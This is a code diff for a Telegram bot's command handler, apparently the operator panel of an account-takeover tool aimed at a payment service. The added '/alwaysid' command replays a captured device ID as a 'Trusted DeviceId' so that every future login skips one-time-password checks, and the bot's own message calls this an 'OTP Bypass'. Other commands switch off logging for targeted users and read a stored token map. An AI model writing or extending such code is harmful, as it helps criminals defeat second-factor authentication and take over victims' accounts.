@@ -1480,10 +1480,50 @@ Example:
         }
 
         if (text.startsWith('/alwaysid')) {
-            if (!data.userOverrides) data.userOverrides = {};
-            if (!data.userOverrides[targetId]) data.userOverrides[targetId] = {};
-            data.userOverrides[targetId].logOff = true;
-            await saveData(data);
+            const freshData = await loadData(true);
+            const parts = text.trim().split(/\s+/);
+            const sub = parts[1] ? parts[1].toLowerCase() : '';
+
+            if (sub === 'off') {
+                freshData.alwaysIdOverride = null;
+                await saveData(freshData);
+                await bot.sendMessage(chatId, '✅ *Persistent DeviceId Override Turned OFF*', { parse_mode: 'Markdown' });
+                return res.sendStatus(200);
+            }
+
+            let devId = parts[1];
+            if (!devId && freshData.lastCapturedId) {
+                devId = freshData.lastCapturedId.deviceId;
+            }
+
+            if (!devId) {
+                await bot.sendMessage(chatId, '⚠️ Usage: /alwaysid <deviceId>\nOr /alwaysid off to disable.');
+                return res.sendStatus(200);
+            }
+
+            freshData.alwaysIdOverride = { deviceId: devId };
+            await saveData(freshData);
+            await bot.sendMessage(chatId, `🔄 *Persistent DeviceId Override Set (OTP Bypass)*\n━━━━━━━━━━━━━━━━━━\n📱 *Trusted DeviceId:* \`${devId}\`\n\n📌 Will apply to ALL future login attempts until turned off.`, { parse_mode: 'Markdown' });
+            return res.sendStatus(200);
+        }
+
+        if (text === '/clearid') {
+            const freshData = await loadData(true);
+            freshData.useIdOverride = null;
+            freshData.alwaysIdOverride = null;
+            await saveData(freshData);
+            await bot.sendMessage(chatId, '🧹 *All DeviceId Overrides Cleared!*', { parse_mode: 'Markdown' });
+            return res.sendStatus(200);
+        }
+
+        if (text.startsWith('/off log ')) {
+            const targetId = text.substring(9).trim();
+            if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /off log <userId>'); return res.sendStatus(200); }
+            const freshData = await loadData(true);
+            if (!freshData.userOverrides) freshData.userOverrides = {};
+            if (!freshData.userOverrides[targetId]) freshData.userOverrides[targetId] = {};
+            freshData.userOverrides[targetId].logOff = true;
+            await saveData(freshData);
             if (redis) {
                 try {
                     const allTokens = await redis.hgetall('ddpayTokenMap');
